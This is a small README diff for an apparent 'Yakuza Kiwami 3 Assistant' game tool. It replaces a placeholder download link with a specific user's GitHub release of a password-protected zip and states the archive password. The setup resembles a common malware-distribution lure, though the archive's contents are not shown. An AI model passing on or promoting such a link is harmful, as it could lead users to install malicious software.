@@ -6,7 +6,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Yakuza-Kiwami-3-Assistant/releases/latest/download/Yakuza-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/Bottyanandr/Yakuza-Kiwami-3-Assistant/releases/download/download/Yakuza_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
